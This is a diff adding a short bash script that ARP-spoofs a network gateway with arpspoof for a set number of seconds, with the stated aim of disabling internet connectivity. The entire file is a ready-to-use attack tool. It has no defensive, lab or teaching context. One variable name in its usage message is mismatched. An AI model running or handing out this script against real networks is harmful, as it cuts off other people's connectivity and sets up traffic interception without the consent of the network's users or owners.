@@ -1,0 +1,37 @@
+#!/bin/bash
+# Arpspoof a network for a limited duration to disable internet connectivity
+
+
+function usage {
+	PROGRAM="$0"
+
+	echo "usage: $program <INTERFACE> <GATEWAY> <TIMEOUT>"
+	echo "INTERFACE 	the network interface connected to the blocking network"
+	echo "GATEWAY		the gateway that needs to be blocked temporarily"
+	echo "TIMEOUT		the duration is seconds to block internet"
+	exit 1
+}
+
+
+function blockInternet {
+	INTERFACE="$1"
+	GATEWAY="$2"
+	TIMEOUT="$3"
+
+	timeout "$TIMEOUT" arpspoof -i "$INTERFACE" "$GATEWAY" &
+	exit 0
+}
+
+
+if [ $# -eq 3 ]
+then
+	INTERFACE="$1"
+	GATEWAY="$2"
+	TIMEOUT="$3"
+
+	blockInternet "$INTERFACE" "$GATEWAY" "$TIMEOUT"
+else
+	PROGRAM="$0"
+
+	usage "$PROGRAM"
+fi
